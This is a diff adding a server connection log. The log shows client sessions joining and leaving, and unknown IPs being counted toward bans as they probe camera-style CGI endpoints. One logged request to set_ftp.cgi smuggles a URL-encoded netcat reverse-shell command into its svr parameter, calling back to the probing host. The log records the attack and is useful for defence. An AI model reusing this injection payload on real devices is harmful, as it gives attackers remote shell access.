@@ -1,0 +1,29 @@
+Connection Successful - 
+Client on 94.236.129.243 with ID 0'rGw1uYCrLS
+Client on 94.236.129.243 with ID 1'Xr0jJr7A7o
+Client 0'rGw1uYCrLS disconnected...
+Client on 94.236.129.243 with ID 0'TCbg1iqvE2
+Client on 94.236.129.243 with ID 2'JVWERvaL72
+Client 0'TCbg1iqvE2 disconnected...
+Client on 94.236.129.243 with ID 0'H54Ko8TBJR
+Client on 94.236.129.243 with ID 3'jP2MVcvjCm
+Client 0'H54Ko8TBJR disconnected...
+unknown host attempted connection from IP: 209.141.56.41, ban counter: 1
+message: GET login.cgi HTTP/1.1
+
+
+unknown host attempted connection from IP: 209.141.56.41, ban counter: 2
+message: GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+209.141.56.41+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1
+
+
+unknown host attempted connection from IP: 209.141.56.41, ban counter: 3
+message: GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1
+
+
+Client 1'Xr0jJr7A7o disconnected...
+Client 2'JVWERvaL72 disconnected...
+Client 3'jP2MVcvjCm disconnected...
+unknown host attempted connection from IP: 137.184.109.73, ban counter: 1
+message: GET login.cgi HTTP/1.1
+
+
